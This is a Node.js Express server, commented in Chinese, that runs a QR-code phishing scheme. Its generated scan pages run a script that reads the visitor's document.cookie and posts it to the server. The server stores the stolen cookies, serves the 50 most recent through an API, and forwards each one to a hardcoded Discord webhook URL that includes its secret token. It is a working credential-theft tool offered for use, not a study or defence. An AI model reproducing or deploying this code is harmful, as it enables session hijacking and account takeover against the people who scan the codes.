const express = require("express");
const { v4: uuidv4 } = require("uuid");
const path = require("path");
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const WEBHOOK_URL = "https://discord.com/api/webhooks/1494697274121650310/DAbxLzXxdk4EWHyZpeJwVKydfQdQEyul4lOnjE8HAvNouZuwAQP8Sd8w_dLsrxYV6zG1";

// 内存存储
const scans = {};     // scanId -> { status, cookie, createdAt }
const cookies = [];  // [{ cookie, time }]

// ====== 页面路由 ======
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "scan.html"));
});

app.get("/cookies", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "cookies.html"));
});

// ====== 扫码链接 ======
app.get("/s/:scanId", (req, res) => {
    const { scanId } = req.params;
    const scan = scans[scanId];

    if (!scan) {
        return res.send("链接已过期或不存在");
    }

    if (scan.status === "done") {
        return res.send("该二维码已被使用");
    }

    // 通过js获取cookie然后提交
    res.send(`<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"></head>
<body>
<script>
fetch("/api/submit", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
        scanId: "${scanId}",
        cookie: document.cookie
    })
}).then(r => r.json()).then(data => {
    document.body.innerHTML = data.ok ? "✅ 成功" : "❌ 失败";
});
</script>
</body>
</html>`);
});

// ====== 生成二维码 ======
app.get("/api/qr", (req, res) => {
    const scanId = uuidv4();
    const scanUrl = `https://${req.get("host")}/s/${scanId}`;

    scans[scanId] = {
        status: "wait",
        cookie: null,
        createdAt: Date.now()
    };

    res.json({ scanId, scanUrl });
});

// ====== 提交Cookie ======
app.post("/api/submit", (req, res) => {
    const { scanId, cookie } = req.body;
    const scan = scans[scanId];

    if (!scan) {
        return res.status(404).json({ ok: false, error: "scan not found" });
    }

    scan.status = "done";
    scan.cookie = cookie;
    cookies.push({ cookie, time: new Date().toISOString() });

    // 异步发到Discord（不阻塞响应）
    sendToDiscord(cookie);
    
    res.json({ ok: true });
});

// ====== 检查扫码状态 ======
app.get("/api/check", (req, res) => {
    const { id } = req.query;
    const scan = scans[id];

    if (!scan) {
        return res.json({ status: "expired" });
    }

    res.json({ status: scan.status, cookie: scan.cookie });
});

// ====== 获取所有Cookie ======
app.get("/api/cookies", (req, res) => {
    res.json(cookies.slice(-50).reverse());
});

// ====== 发送Discord ======
async function sendToDiscord(cookie) {
    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: `**新Cookie**\n\`\`\`\n${cookie}\n\`\`\``
            })
        });
    } catch (e) {
        console.error("Discord发送失败:", e.message);
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`运行在端口 ${PORT}`));